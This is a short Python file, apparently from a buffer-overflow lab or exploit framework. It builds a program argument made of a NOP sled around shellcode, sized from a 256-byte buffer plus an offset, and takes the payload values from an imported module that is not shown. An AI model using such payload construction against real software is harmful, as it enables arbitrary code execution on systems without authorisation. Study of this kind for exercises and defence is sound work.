from toimport import *
from math import *

input_type = Input.args
buff_size = 256
def calcArgs():
    global args
    args = [None] * 2 #2 is number of arugments
    args[0] = str(-1)
    args[1] = vals.NOP*floor((buff_size + vals.offset - len(vals.shellcode))/2) + vals.shellcode + vals.NOP*ceil((buff_size + vals.offset - len(vals.shellcode))/2)

